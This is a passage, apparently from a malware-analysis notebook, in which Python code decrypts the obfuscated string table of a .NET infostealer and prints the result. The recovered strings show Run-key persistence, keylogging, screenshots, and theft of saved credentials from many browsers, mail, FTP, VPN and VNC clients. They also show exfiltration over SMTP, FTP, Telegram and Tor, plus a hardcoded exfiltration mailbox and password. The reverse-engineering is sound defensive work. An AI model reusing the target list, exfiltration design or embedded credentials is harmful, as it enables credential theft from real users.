&quot;RuntimeHelpers::InitializeArray&quot; in method.Body.Instructions[ptr].ToString(): arr_inst = method.Body.Instructions[ptr-1] arr_rva = arr_inst.Operand.RVA arr_size = arr_inst.Operand.GetFieldSize() out.append(pe.get_data(arr_rva, arr_size)) key_flag = True if key_flag: if &quot;xor&quot; in method.Body.Instructions[ptr].ToString() and &quot;ldc.i4&quot; in method.Body.Instructions[ptr - 1].ToString(): keys.append(method.Body.Instructions[ptr - 1].Operand) if len(out) == 0: return None arr_data = max(out, key=len) # For each key try to decrypt and save the one that # decrypt to valid ascii ptxt_data = None for key in keys: tmp_out = decrypt(arr_data, key) if pct_ascii(tmp_out) &gt; 0.8: ptxt_data = tmp_out break return ptxt_data strings_table = get_strings_table(target_module, pe) strings_table . b&#39;20yyyy-MM-dd HH:mm:ssyyyy_MM_dd_HH_mm_ss&lt;br&gt;&lt;hr&gt;ObjectLengthChainingModeGCMAuthTagLengthChainingModeKeyDataBlobAESMicrosoft Primitive ProviderCONNECTIONKEEP-ALIVEPROXY-AUTHENTICATEPROXY-AUTHORIZATIONTETRAILERTRANSFER-ENCODINGUPGRADE%startupfolder% %insfolder% %insname%/ %insfolder% Software Microsoft Windows CurrentVersion Run%insregname%SOFTWARE Microsoft Windows CurrentVersion Explorer StartupApproved RunTrue%GETMozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0OKhttp://pjQxEo.com XPXSELECT * FROM Win32_ProcessorName MBUnknownCOCO_-_.zip yyyy-MM-dd hh-mm-ssCookieapplication/zipSCSC_.jpegScreenshotimage/jpeg/log.tmpKLKL_.html&lt;html&gt;&lt;/html&gt;Logtext/html[]Time: MM/dd/yyyy HH:mm:ssUser Name: Computer Name: OSFullName: CPU: RAM: IP Address: New Recovered!User Name: OSFullNameuninstallSoftware Microsoft Windows NT CurrentVersion WindowsLoad%ftphost%/%ftpuser%%ftppassword%STORLengthWriteCloseGetBytesOpera BrowserOpera Software Opera StableYandex BrowserYandex YandexBrowser User DataIridium BrowserIridium User DataChromiumChromium User Data7Star7Star 7Star User DataTorch BrowserTorch User DataCool NovoMapleStudio ChromePlus User DataKometaKometa User DataAmigoAmigo User DataBraveBraveSoftware Brave-Browser User DataCentBrowserCentBrowser User DataChedotChedot User DataOrbitumOrbitum User DataSputnikSputnik Sputnik User DataComodo DragonComodo Dragon User DataVivaldiVivaldi User DataCitrioCatalinaGroup Citrio User Data360 Browser360Chrome Chrome User DataUranuCozMedia Uran User DataLiebao Browserliebao User DataElements BrowserElements Browser User DataEpic PrivacyEpic Privacy Browser User DataCoccocCocCoc Browser User DataSleipnir 6Fenrir Inc Sleipnir5 setting modules ChromiumViewerQIP SurfQIP Surf User DataCoowonCoowon Coowon User DataAPPDATA CoreFTP sites.idxHKEY_CURRENT_USER Software FTPWare COREFTP Sites HostHKEY_CURRENT_USERSoftwareFTPWareCOREFTPSitesPortUserPWCoreFTPwebpanel,&#34;smtpftpURL: Username: Password: Application: URL:Username:Password:Application:PW_ x00kcchdeal@jubana.cam3_sdYb:Q@pq5smtp.jubana.camkcchdealrrrr@jubana.camimage/jpg:Zone.Identifier tmpG.tmp%urlkey%-f Data Tor torrcp=%PostURL%127.0.0.1POST+%2Bapplication/x-www-form-urlencoded&amp;&amp;amp;&lt;&amp;lt;&gt;&amp;gt;&amp;quot;Copied Text: &lt;font color=&#34;#00b1ba&#34;&gt;&lt;b&gt;[ &lt;/b&gt; &lt;b&gt;]&lt;/b&gt; &lt;font color=&#34;#000000&#34;&gt;()&lt;/font&gt;&lt;/font&gt;False&lt;font color=&#34;#00ba66&#34;&gt;{BACK}&lt;/font&gt;&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{ALT+TAB}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{ALT+F4}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{TAB}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{ESC}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{Win}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{CAPSLOCK}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;&amp;uarr;&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;&amp;darr;&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;&amp;larr;&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;&amp;rarr;&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{DEL}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{END}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{HOME}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{Insert}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{NumLock}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{PageDown}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{PageUp}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{ENTER}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{F1}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{F2}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{F3}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{F4}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{F5}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{F6}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{F7}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{F8}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{F9}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{F10}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{F11}&lt;/font&gt;&lt;font color=&#34;#00ba66&#34;&gt;{F12}&lt;/font&gt;control&lt;font color=&#34;#00ba66&#34;&gt;{CTRL}&lt;/font&gt;Windows RDPcredentialpolicyblobrdgchrome{{{0}}}CopyToComputeHashsha512CopySystemDrive WScript.ShellRegReadg401 r n r n502 r n r n500 Addchat_idcaption/sendDocumentdocumentx r n-- r nmultipart/form-data; boundary=Content-Disposition: form-data; name=&#34;{0}&#34; r n r n{1}Content-Disposition: form-data; name=&#34;{0}&#34;; filename=&#34;{1}&#34; r nContent-Type: {2} r n r n-- r nCookiesOperaChrome Google Chrome User Data 360Chrome Chrome User DataYandexSRWare IronBrave Browser Iridium User DataCoolNovoEpic Privacy BrowserCocCocQQ BrowserTencent QQBrowser User DataUC BrowserUCBrowser uCozMediacookies.sqliteFirefox Mozilla Firefox IceCat Mozilla icecat PaleMoon Moonchild Productions Pale Moon SeaMonkey Mozilla SeaMonkey Flock Flock Browser K-Meleon K-Meleon Postbox Postbox Thunderbird Thunderbird IceDragon Comodo IceDragon WaterFox Waterfox BlackHawk NETGATE Technologies BlackHawk CyberFox 8pecxstudios Cyberfox Path=([A-z0-9 / . -]+)profiles.ini Default Profileorigin_urlusername_valuepassword_valuev10v11Opera Stable Local State&#34;encrypted_key&#34;:&#34;(.*?)&#34; Default Login Data Login Data Google Chrome User Data loginsMajorMinor2F1A6504-0641-44CF-8BB5-3612D865F2E5Windows Secure Note3CCD5499-87A8-4B10-A215-608888DD3B55Windows Web Password Credential154E23D0-C644-4E6F-8CE6-5069272F999FWindows Credential Picker Protector4BF4C442-9B8A-41A0-B380-DD4A704DDB28Web Credentials77BC582B-F0A6-4E15-4E80-61736B6F3B29Windows CredentialsE69D7838-91B5-4FC9-89D5-230D4D4CC2BCWindows Domain Certificate Credential3E0E35BE-1B77-43E7-B873-AED901B6275BWindows Domain Password Credential3C886FF3-2669-4AA2-A8FB-3F6759A77548Windows Extended Credential00000000-0000-0000-0000-000000000000SchemaIdpResourceElementpIdentityElementpPackageSidpAuthenticatorElementIE/EdgeTypeValue Common Files Apple Apple Application Support plutil.exe Apple Computer Preferences keychain.plist*Login Datajournalwow_logins Microsoft Edge User DataEdge Chromium Microsoft Credentials Microsoft Protect GuidMasterKey Default EncryptedStorage EncryptedStorageentriescategoryPasswordstr3str2blob0PopPasswordSmtpPasswordSoftware IncrediMail Identities Accounts_NewEmailAddressSmtpServerincredimailHKEY_CURRENT_USER Software Qualcomm Eudora CommandLinecurrentSettingsSavePasswordTextReturnAddressEudora falkon profiles startProfile=&#34;([A-z0-9 / .]+)&#34; browsedata.dbautofillFalkon BrowserstartProfile=([A-z0-9 / .]+)Backend=([A-z0-9 / .-]+) settings.ini Claws-mail clawsrcpasskey0master_passphrase_salt=(.+)master_passphrase_pbkdf2_rounds=(.+)use_master_passphrase=(.+) accountrcsmtp_serveraddressaccount passwordstorerc{(.*),(.*)}(.*)ClawsMailTransformFinalBlockSubstringIterationCountsignons3.txt r n. r nobjectsDataDecryptTripleDesFlock BrowserALLUSERSPROFILE DynDNS Updater config.dyndnsusername==password=&amp;Ht6KzXhChhttp://DynDns.comDynDNS Psi profiles Psi+ profiles accounts.xmlnamejidpasswordPsi/Psi+Software OpenVPN-GUI configsSoftware OpenVPN-GUI configs usernameauth-dataentropyOpen VPNUSERPROFILE OpenVPN config remote FileZilla recentservers.xml&lt;Server&gt;&lt;Host&gt;&lt;/Host&gt;:&lt;Port&gt;&lt;/Port&gt;&lt;User&gt;&lt;/User&gt;&lt;Pass encoding=&#34;base64&#34;&gt;&lt;/Pass&gt;&lt;Pass&gt;FileZillaSOFTWARE Martin Prikryl WinSCP 2 SessionsHostNameUserNamePublicKeyFilePortNumber22[PRIVATE KEY LOCATION: &#34;{0}&#34;]WinSCPUsernameAll Users FlashFXP 3quick.datIP=port=user=pass=created=FlashFXP FTP Navigator Ftplist.txtServerNo PasswordFTP NavigatorProgramfiles(x86)programfiles jDownloader config database.scriptprogramfiles(x86)INSERT INTO CONFIG VALUES( &#39;AccountController &#39;, &#39;sq.txtJDownloaderSoftware PaltalkHKEY_CURRENT_USER Software Paltalk pwdPaltalk .purple accounts.xml&lt;account&gt;&lt;protocol&gt;&lt;/protocol&gt;&lt;name&gt;&lt;/name&gt;&lt;password&gt;&lt;/password&gt;Pidgin SmartFTP Client 2.0 Favorites Quick Connect SmartFTP Client 2.0 Favorites Quick Connect *.xml&lt;Password&gt;&lt;/Password&gt;&lt;Name&gt;&lt;/Name&gt;SmartFTPappdata Ipswitch WS_FTP Sites ws_ftp.iniHOSTUIDPWDWS_FTPPWD=KeyModeIVPaddingCreateDecryptor cftp Ftplist.txt;Server=;Port=;Password=;User=;Anonymous=Name=FTPCommander FTPGetter servers.xml&lt;server&gt;&lt;server_ip&gt;&lt;/server_ip&gt;&lt;server_port&gt;&lt;/server_port&gt;&lt;server_user_name&gt;&lt;/server_user_name&gt;&lt;server_user_password&gt;&lt;/server_user_password&gt;FTPGetterHKEY_LOCAL_MACHINE SOFTWARE Vitalwerks DUCHKEY_CURRENT_USER SOFTWARE Vitalwerks DUCUSERnameNO-IP+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz The Bat! Account.CFNzzz x00 x00 x00TheBatHKEY_CURRENT_USER Software RimArts B2 SettingsDataDirFolder.lst Mailbox.iniAccountSMTPServerMailAddressPassWdBecky! Trillian users global accounts.datAccountsTrillianSoftware Microsoft Office 15.0 Outlook Profiles Outlook 9375CFF0413111d3B88A00104B2A6676Software Microsoft Windows NT CurrentVersion Windows Messaging Subsystem Profiles Outlook 9375CFF0413111d3B88A00104B2A6676Software Microsoft Windows Messaging Subsystem Profiles 9375CFF0413111d3B88A00104B2A6676Software Microsoft Office 16.0 Outlook Profiles Outlook 9375CFF0413111d3B88A00104B2A6676EmailIMAP PasswordPOP3 PasswordHTTP PasswordSMTP PasswordSMTP ServerOutlookHKEY_CURRENT_USER Software Aerofox FoxmailPreviewExecutableHKEY_CURRENT_USER Software Aerofox Foxmail V3.1FoxmailPath Storage mail VirtualStore Program Files Foxmail mail VirtualStore Program Files (x86) Foxmail mail Accounts Account.rec0 Account.stgReadDisposePOP3HostSMTPHostIncomingServerPOP3PasswordFoxmail5A71 Opera Mail Opera Mail wand.datopera:Opera Mailabc xc3 xa7defg xc4 x9fh xc4 xb1ijklmno xc3 xb6pqrs xc5 x9ftu xc3 xbcvwxyz1234567890_-.~!@#$%^&amp;*()[{]} | &#39;;:,&lt;&gt;/?+= r n Pocomail accounts.iniPOPPassSMTPPassSMTPPocoMailRealVNC 4.xSOFTWARE Wow6432Node RealVNC WinVNC4RealVNC 3.xSOFTWARE RealVNC vncserverSOFTWARE RealVNC WinVNC4Software ORL WinVNC3TightVNCSoftware TightVNC ServerPasswordViewOnlyTightVNC ControlPasswordControlPasswordTigerVNCSoftware TigerVNC ServerTrimUltraVNCProgramFiles(x86) uvnc bvba UltraVNC ultravnc.inipasswdpasswd2ProgramFiles UltraVNC ultravnc.ini r n eM Client.dlleM Client accounts.dateM ClientAccountConfiguration72905C47-F4FD-4CF7-A489-4E8121A155BDhosto6806642kbM7c5 Mailbird Store Store.dbServer_HostEncryptedPasswordMailbirdSenderIdentitiesNordVPNNordVPN directory not found!NordVpn.exe*user.configSelectSingleNode//setting[@name= &#39;Username &#39;]/valueInnerText//setting[@name= &#39;Password &#39;]/value MySQL Workbench workbench_user_data.dat x02 x03MySQL Workbench%ProgramW6432%Private Internet Access data Private Internet Access data account.json.*&#34;username&#34;:&#34;(.*?)&#34;.*&#34;password&#34;:&#34;(.*?)&#34;Private Internet Access&lt;array&gt;&lt;dict&gt;&lt;string&gt;&lt;/string&gt;&lt;data&gt;&lt;/data&gt;Safari Browser -convert xml1 -s -o &#34; fixed_keychain.xml&#34; A10B11C12D13E14F15ABCDEF(EndsWith)IndexOfUNIQUEtableSoftware DownloadManager Passwords EncPasswordInternet Download Manager{0}http://127.0.0.1:HTTP/1.1 Hostname200 Connection established r nProxy-Agent: HToS5x r n r nConnectPathAndQueryFragment r nHost: WrWExtractFilenTorAUTHENTICATE &#34;%torpass%&#34;SIGNAL NEWNYM250torStartInfoFileName Tor tor.exeArgumentsUseShellExecuteRedirectStandardOutputCreateNoWindowStartStandardOutputReadLineContainsBootstrapped 100%EndOfStreamIdAvoidDiskWrites 1 r nLog notice stdout r nDormantCanceledByStartup 1 r nControlPort 9051 r nCookieAuthentication 1 r nrunasdaemon 1 r nExtORPort auto r nhashedcontrolpassword %hash% r nDataDirectory %tordir% Data Tor r nGeoIPFile %tordir% Data Tor geoip r nGeoIPv6File %tordir% Data Tor geoip6 r n tor.ziphttps://www.theonionrouter.com/dist.torproject.org/torbrowser/9.5.3/tor-win32-0.4.3.6.zip%tordir%%hash%%torpass%https://www.theonionrouter.com/dist.torproject.org/torbrowser/&lt;a.+?href s*= s*([&#34; &#39;])(?&lt;href&gt;.+?) 1[^&gt;]*&gt;hrefReplaceTrimStartTrimEndtor-win32-TransformBlockHash16:Nonewin32_processorprocessorID076343ad-49fa-41e5-b7b9-ec7c667b3e14Win32_NetworkAdapterConfigurationIPEnabledMacAddresse436286e-22df-4cd6-96d1-470b765682b1WinMgmts:InstancesOfWin32_BaseBoardSerialNumber356d6f2c-400a-4f1c-9d19-779919dea534x200061561Berkelet DB00000002 1.85 (Hash, version 2, native byte-order)Unknow database formatSEQUENCE {{0:X2} tINTEGER tOCTETSTRING tOBJECTIDENTIFIER }sha256key4.dbmetaDataiditem1item2nssPrivatea11a1022a864886f70d02092a864886f70d010c050103key3.dbglobal-saltVersionpassword-checklogins.json &#34;(hostname|encryptedPassword|encryptedUsername)&#34;:&#34;(.*?)&#34;[^ u0020- u007F]signons.sqlitemoz_loginshostnameencryptedUsernameencryptedPasswordVersion=4.0.0.0version=2.0.0.0mscorlibSystemMailClient.Protocols.Smtp.SmtpAccountConfigurationMailClient.Accounts.TlsTypeMailClient.Accounts.CredentialsModelTypesMailClient.Accounts.Mail.MailAccountConfigurationMailClient.Accounts.ArchivingScopeMailClient.Mail.MailAddress;infoAccountConfiguration+accountNameAccountConfiguration+usernameAccountConfiguration+passwordproviderName&#39; . # 0x0001F0CB 202D080000 */ IL_0014: ldc.i4 2093 // offset # 0x0001F0D0 1F09 */ IL_0019: ldc.i4.s 9 // size # 0x0001F0D2 282D020006 */ IL_001B: call string . # offset,size str_offsets = [] for mtype in target_module.GetTypes(): if not mtype.HasMethods: continue for method in mtype.Methods: # The get string functions are public and return a string if not method.IsPublic: continue if method.ReturnType.ToString() != &quot;System.String&quot;: continue if not method.HasBody: continue if not method.Body.HasInstructions: continue if len(method.Body.Instructions) &lt; 10: continue key_set = False block_set = False key_flag = False for ptr in range(10): if &quot;call System.String&quot; in method.Body.Instructions[ptr].ToString(): if &quot;ldc&quot; in method.Body.Instructions[ptr-1].ToString() and &quot;ldc&quot; in method.Body.Instructions[ptr-2].ToString() and &quot;ldc&quot; in method.Body.Instructions[ptr-3].ToString(): if method.Body.Instructions[ptr-1].Operand is None: str_size = int(method.Body.Instructions[ptr-1].ToString().split(&#39;.&#39;)[-1]) else: str_size = method.Body.Instructions[ptr-1].Operand if method.Body.Instructions[ptr-2].Operand is None: str_offset = int(method.Body.Instructions[ptr-2].ToString().split(&#39;.&#39;)[-1]) else: str_offset = method.Body.Instructions[ptr-2].Operand str_offsets.append((str_offset, str_size)) str_offsets . [(0, 0), (0, 2), (2, 19), (21, 19), (40, 4), (44, 4), (48, 12), (60, 15), (75, 13), (88, 12), (100, 11), (111, 3), (114, 28), (142, 10), (152, 10), (162, 18), (180, 19), (199, 2), (201, 7), (208, 17), (225, 7), (232, 15), (247, 22), (269, 1), (270, 13), (283, 45), (328, 12), (340, 70), (410, 4), (414, 1), (415, 3), (418, 78), (496, 2), (498, 17), (515, 4), (519, 29), (548, 4), (552, 3), (555, 7), (562, 2), (564, 3), (567, 1), (568, 1), (569, 4), (573, 1), (574, 19), (593, 6), (599, 15), (614, 2), (616, 3), (619, 5), (624, 10), (634, 10), (644, 8), (652, 2), (654, 3), (657, 5), (662, 6), (668, 7), (675, 3), (678, 9), (687, 1), (688, 1), (689, 6), (695, 19), (714, 11), (725, 15), (740, 12), (752, 5), (757, 5), (762, 12), (774, 4), (778, 11), (789, 9), (798, 2), (800, 10), (810, 9), (819, 52), (871, 4), (875, 10), (885, 9), (894, 13), (907, 4), (911, 6), (917, 5), (922, 5), (927, 8), (935, 13), (948, 27), (975, 14), (989, 30), (1019, 15), (1034, 17), (1051, 8), (1059, 18), (1077, 5), (1082, 21), (1103, 13), (1116, 15), (1131, 9), (1140, 32), (1172, 6), (1178, 16), (1194, 5), (1199, 15), (1214, 5), (1219, 37), (1256, 11), (1267, 21), (1288, 6), (1294, 16), (1310, 7), (1317, 17), (1334, 7), (1341, 25), (1366, 13), (1379, 23), (1402, 7), (1409, 17), (1426, 6), (1432, 30), (1462, 11), (1473, 26), (1499, 4), (1503, 24), (1527, 14), (1541, 16), (1557, 16), (1573, 26), (1599, 12), (1611, 30), (1641, 6), (1647, 24), (1671, 10), (1681, 51), (1732, 8), (1740, 18), (1758, 6), (1764, 23), (1787, 7), (1794, 18), (1812, 49), (1861, 4), (1865, 44), (1909, 4), (1913, 4), (1917, 2), (1919, 7), (1926, 8), (1934, 1), (1935, 1), (1936, 4), (1940, 3), (1943, 10), (1953, 10), (1963, 10), (1973, 13), (1986, 4), (1990, 9), (1999, 9), (2008, 12), (2020, 3), (2023, 1), (2024, 19), (2043, 12), (2055, 15), (2070, 23), (2093, 9), (2102, 16), (2118, 5), (2123, 4), (2127, 8), (2135, 3), (2138, 15), (2153, 2), (2155, 9), (2164, 9), (2173, 4), (2177, 1), (2178, 3), (2181, 33), (2214, 1), (2215, 5), (2220, 1), (2221, 4), (2225, 1), (2226, 4), (2230, 6), (2236, 13), (2249, 27), (2276, 4), (2280, 33), (2313, 15), (2328, 5), (2333, 35), (2368, 7), (2375, 38), (2413, 37), (2450, 34), (2484, 34), (2518, 34), (2552, 39), (2591, 35), (2626, 35), (2661, 35), (2696, 35), (2731, 34), (2765, 34), (2799, 35), (2834, 37), (2871, 38), (2909, 39), (2948, 37), (2985, 36), (3021, 33), (3054, 33), (3087, 33), (3120, 33), (3153, 33), (3186, 33), (3219, 33), (3252, 33), (3285, 33), (3318, 34), (3352, 34), (3386, 34), (3420, 7), (3427, 35), (3462, 11), (3473, 10), (3483, 6), (3489, 4), (3493, 3), (3496, 6), (3502, 7), (3509, 6), (3515, 11), (3526, 6), (3532, 4), (3536, 11), (3547, 1), (3548, 13), (3561, 7), (3568, 1), (3569, 7), (3576, 4), (3580, 4), (3584, 4), (3588, 3), (3591, 7), (3598, 7), (3605, 13), (3618, 8), (3626, 27), (3653, 1), (3654, 4), (3658, 2), (3660, 30), (3690, 49), (3739, 81), (3820, 4), (3824, 7), (3831, 5), (3836, 6), (3842, 24), (3866, 27), (3893, 6), (3899, 11), (3910, 13), (3923, 18), (3941, 8), (3949, 20), (3969, 6), (3975, 10), (3985, 27), (4012, 10), (4022, 10), (4032, 9), (4041, 14), (4055, 7), (4062, 17), (4079, 6), (4085, 16), (4101, 8), (4109, 33), (4142, 9), (4151, 19), (4170, 5), (4175, 15), (4190, 8), (4198, 10), (4208, 7), (4215, 9), (4224, 11), (4235, 13), (4248, 9), (4257, 18), (4275, 8), (4283, 10), (4293, 9), (4302, 32), (4334, 8), (4342, 23), (4365, 22), (4387, 12), (4399, 9), (4408, 7), (4415, 10), (4425, 14), (4439, 14), (4453, 3), (4456, 3), (4459, 12), (4471, 12), (4483, 23), (4506, 19), (4525, 11), (4536, 25), (4561, 6), (4567, 5), (4572, 5), (4577, 36), (4613, 19), (4632, 36), (4668, 31), (4699, 36), (4735, 35), (4770, 36), (4806, 15), (4821, 36), (4857, 19), (4876, 36), (4912, 37), (4949, 36), (4985, 34), (5019, 36), (5055, 27), (5082, 36), (5118, 8), (5126, 16), (5142, 16), (5158, 11), (5169, 21), (5190, 7), (5197, 4), (5201, 5), (5206, 56), (5262, 42), (5304, 1), (5305, 10), (5315, 7), (5322, 10), (5332, 25), (5357, 13), (5370, 23), (5393, 19), (5412, 13), (5425, 25), (5450, 17), (5467, 7), (5474, 8), (5482, 8), (5490, 4), (5494, 4), (5498, 5), (5503, 11), (5514, 12), (5526, 32), (5558, 13), (5571, 12), (5583, 10), (5593, 11), (5604, 54), (5658, 7), (5665, 8), (5673, 16), (5689, 13), (5702, 6), (5708, 17), (5725, 30), (5755, 14), (5769, 8), (5777, 14), (5791, 28), (5819, 24), (5843, 13), (5856, 11), (5867, 8), (5875, 8), (5883, 27), (5910, 36), (5946, 26), (5972, 10), (5982, 11), (5993, 7), (6000, 7), (6007, 16), (6023, 15), (6038, 9), (6047, 19), (6066, 9), (6075, 14), (6089, 12), (6101, 3), (6104, 5), (6109, 7), (6116, 4), (6120, 16), (6136, 13), (6149, 15), (6164, 2), (6166, 28), (6194, 9), (6203, 1), (6204, 9), (6213, 2), (6215, 8), (6223, 17), (6240, 6), (6246, 13), (6259, 14), (6273, 13), (6286, 4), (6290, 3), (6293, 8), (6301, 8), (6309, 28), (6337, 29), (6366, 8), (6374, 9), (6383, 7), (6390, 8), (6398, 11), (6409, 16), (6425, 7), (6432, 28), (6460, 8), (6468, 6), (6474, 7), (6481, 1), (6482, 6), (6488, 7), (6495, 6), (6501, 7), (6508, 24), (6532, 7), (6539, 6), (6545, 9), (6554, 44), (6598, 8), (6606, 8), (6614, 13), (6627, 10), (6637, 2), (6639, 29), (6668, 6), (6674, 8), (6682, 9), (6691, 20), (6711, 3), (6714, 5), (6719, 5), (6724, 5), (6729, 8), (6737, 8), (6745, 26), (6771, 6), (6777, 11), (6788, 13), (6801, 17), (6818, 12), (6830, 35), (6865, 17), (6882, 47), (6929, 2), (6931, 1), (6932, 1), (6933, 2), (6935, 11), (6946, 16), (6962, 35), (6997, 3), (7000, 7), (7007, 21), (7028, 9), (7037, 10), (7047, 11), (7058, 6), (7064, 7), (7071, 10), (7081, 11), (7092, 6), (7098, 45), (7143, 50), (7193, 10), (7203, 11), (7214, 6), (7220, 7), (7227, 8), (7235, 7), (7242, 33), (7275, 4), (7279, 3), (7282, 3), (7285, 6), (7291, 4), (7295, 3), (7298, 4), (7302, 2), (7304, 7), (7311, 15), (7326, 17), (7343, 8), (7351, 6), (7357, 10), (7367, 6), (7373, 11), (7384, 5), (7389, 12), (7401, 22), (7423, 8), (7431, 11), (7442, 12), (7454, 13), (7467, 14), (7481, 18), (7499, 19), (7518, 22), (7540, 23), (7563, 9), (7572, 42), (7614, 41), (7655, 8), (7663, 5), (7668, 64), (7732, 9), (7741, 12), (7753, 3), (7756, 3), (7759, 6), (7765, 46), (7811, 7), (7818, 10), (7828, 12), (7840, 7), (7847, 10), (7857, 11), (7868, 6), (7874, 6), (7880, 35), (7915, 8), (7923, 8), (7931, 88), (8019, 122), (8141, 88), (8229, 88), (8317, 5), (8322, 13), (8335, 13), (8348, 13), (8361, 13), (8374, 11), (8385, 7), (8392, 49), (8441, 10), (8451, 47), (8498, 11), (8509, 9), (8518, 6), (8524, 41), (8565, 47), (8612, 22), (8634, 12), (8646, 4), (8650, 7), (8657, 8), (8665, 8), (8673, 14), (8687, 12), (8699, 7), (8706, 2), (8708, 2), (8710, 31), (8741, 6), (8747, 10), (8757, 81), (8838, 22), (8860, 7), (8867, 8), (8875, 4), (8879, 8), (8887, 11), (8898, 36), (8934, 11), (8945, 26), (8971, 24), (8995, 20), (9015, 8), (9023, 24), (9047, 16), (9063, 24), (9087, 15), (9102, 8), (9110, 24), (9134, 4), (9138, 8), (9146, 17), (9163, 32), (9195, 6), (9201, 7), (9208, 12), (9220, 22), (9242, 1), (9243, 1), (9244, 10), (9254, 4), (9258, 22), (9280, 9), (9289, 20), (9309, 36), (9345, 4), (9349, 14), (9363, 24), (9387, 11), (9398, 17), (9415, 8), (9423, 16), (9439, 7), (9446, 28), (9474, 12), (9486, 11), (9497, 16), (9513, 33), (9546, 9), (9555, 33), (9588, 40), (9628, 1), (9629, 1), (9630, 15), (9645, 14), (9659, 28), (9687, 29), (9716, 13), (9729, 20), (9749, 20), (9769, 23), (9792, 7), (9799, 6), (9805, 8), (9813, 9), (9822, 6), (9828, 7), (9835, 14), (9849, 22), (9871, 21), (9892, 1), (9893, 2), (9895, 1), (9896, 2), (9898, 1), (9899, 2), (9901, 1), (9902, 2), (9904, 1), (9905, 2), (9907, 1), (9908, 2), (9910, 6), (9916, 1), (9917, 8), (9925, 1), (9926, 7), (9933, 6), (9939, 5), (9944, 35), (9979, 11), (9990, 25), (10015, 3), (10018, 17), (10035, 9), (10044, 8), (10052, 51), (10103, 7), (10110, 12), (10122, 8), (10130, 8), (10138, 2), (10140, 1), (10141, 11), (10152, 1), (10153, 3), (10156, 24), (10180, 13), (10193, 3), (10196, 3), (10199, 9), (10208, 8), (10216, 12), (10228, 9), (10237, 15), (10252, 22), (10274, 14), (10288, 5), (10293, 14), (10307, 8), (10315, 8), (10323, 17), (10340, 11), (10351, 2), (10353, 275), (10628, 8), (10636, 89), (10725, 8), (10733, 6), (10739, 9), (10748, 62), (10810, 42), (10852, 4), (10856, 7), (10863, 9), (10872, 7), (10879, 10), (10889, 14), (10903, 4), (10907, 3), (10910, 4), (10914, 15), (10929, 11), (10940, 36), (10976, 33), (11009, 9), (11018, 10), (11028, 36), (11064, 9), (11073, 11), (11084, 15), (11099, 12), (11111, 36), (11147, 2), (11149, 8), (11157, 11), (11168, 8), (11176, 42), (11218, 22), (11240, 10), (11250, 6), (11256, 9), (11265, 13), (11278, 18), (11296, 1), (11297, 6), (11303, 7), (11310, 8), (11318, 2), (11320, 5), (11325, 5), (11330, 10), (11340, 3), (11343, 4), (11347, 16), (11363, 22), (11385, 7), (11392, 11), (11403, 7), (11410, 14), (11424, 11), (11435, 57), (11492, 16), (11508, 14), (11522, 10), (11532, 8), (11540, 17), (11557, 17), (11574, 15), (11589, 15), (11604, 8), (11612, 6), (11618, 50), (11668, 27), (11695, 41), (11736, 49), (11785, 34), (11819, 27), (11846, 1), (11847, 4), (11851, 32), (11883, 29), (11912, 29), (11941, 12)] . strings = [] for offset_info in str_offsets: strings.append(strings_table[offset_info[0]:offset_info[0]+offset_info[1]]) strings . [b&#39;&#39;, b&#39;20&#39;, b&#39;yyyy-MM-dd HH:mm:ss&#39;, b&#39;yyyy_MM_dd_HH_mm_ss&#39;, b&#39;&lt;br&gt;&#39;, b&#39;&lt;hr&gt;&#39;, b&#39;ObjectLength&#39;, b&#39;ChainingModeGCM&#39;, b&#39;AuthTagLength&#39;, b&#39;ChainingMode&#39;, b&#39;KeyDataBlob&#39;, b&#39;AES&#39;, b&#39;Microsoft Primitive Provider&#39;, b&#39;CONNECTION&#39;, b&#39;KEEP-ALIVE&#39;, b&#39;PROXY-AUTHENTICATE&#39;, b&#39;PROXY-AUTHORIZATION&#39;, b&#39;TE&#39;, b&#39;TRAILER&#39;, b&#39;TRANSFER-ENCODING&#39;, b&#39;UPGRADE&#39;, b&#39;%startupfolder%&#39;, b&#39; %insfolder% %insname%&#39;, b&#39;/&#39;, b&#39; %insfolder% &#39;, b&#39;Software Microsoft Windows CurrentVersion Run&#39;, b&#39;%insregname%&#39;, b&#39;SOFTWARE Microsoft Windows CurrentVersion Explorer StartupApproved Run&#39;, b&#39;True&#39;, b&#39;%&#39;, b&#39;GET&#39;, b&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0&#39;, b&#39;OK&#39;, b&#39;http://pjQxEo.com&#39;, b&#39; XPX&#39;, b&#39;SELECT * FROM Win32_Processor&#39;, b&#39;Name&#39;, b&#39; MB&#39;, b&#39;Unknown&#39;, 